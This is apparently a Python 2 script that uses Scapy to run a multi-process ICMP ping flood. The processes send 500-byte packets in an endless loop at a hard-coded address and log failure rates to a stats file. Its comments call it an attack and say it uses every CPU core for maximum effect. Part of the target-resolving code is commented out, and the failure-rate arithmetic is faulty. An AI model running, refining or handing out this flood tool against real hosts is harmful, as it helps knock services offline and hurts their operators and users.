import time
import sys
import multiprocessing
from scapy.all import *

TIMEOUT = 2
conf.verb = 0

def preset(cpu_number): #This method is responsible for starting multiprocessing processes.
        processes = [multiprocessing.Process(target=start_attack, args=()) for i in range(cpu_number)]

        for i in range(cpu_number):
                processes[i].start()
        for i in range(cpu_number):
                processes[i].join()

def start_attack():
        ip_adress = "8.8.8.8"
        data = "X"*500 #Change 900 to adjust value of bytes in ICMP data field. 1440 bytes maximum.
        if len(sys.argv) < 2:
                print "Please give a target"
        else:
                #try:
                #        packet = sr1(IP(dst="195.175.39.49")/UDP()/DNS(rd=1, qd=DNSQR(qname=sys.argv[1])), verbose=False)
                #        ip_adress = packet[1][DNSRR].rdata
                #except:
                #        ip_adress = sys.argv[1]
                #print ip_adress
                s=0 #sucessful trials 
                f=0 #failed trials
                while 1:
                        packet = IP(dst=ip_adress)/ICMP()/data
                        reply = sr1(packet, timeout=TIMEOUT)
                        if not (reply is None):
                                #print reply.dst, "is online"
                                s=s+1

                        else:
                                #print "Timeout waiting for %s" % packet[IP].dst
                                f=f+1
                        #print "failure rate = "+ str( f/(s+f) ) + "f,s=" + str(f) + "," + str(s)
                        x="failure rate = "+ str( f/(s+f) ) + "f,s=" + str(f) + "," + str(s)
                        with open('attack_stats.txt', 'w+') as the_file:
                                the_file.write(x)

#               send(IP(dst=ip_adress)/ICMP()/data, verbose=False, loop=1) #If you want to send limited number of packets, remove loop field and add count=<number of packets> field

def main():
        t = round(time.time())

        preset(5)#multiprocessing.cpu_count()-1) #This tool will use all cores of your cpu [except first core], to get maximum effect for this attack. 

        print "Finished with: %s seconds" % (round(time.time() - t))
        sys.exit()


if __name__ == '__main__':
#god help 
        try:
                t = round(time.time())
                main()
        except:
                print "Finished with: %s seconds" % (round(time.time() - t))
                sys.exit()
                
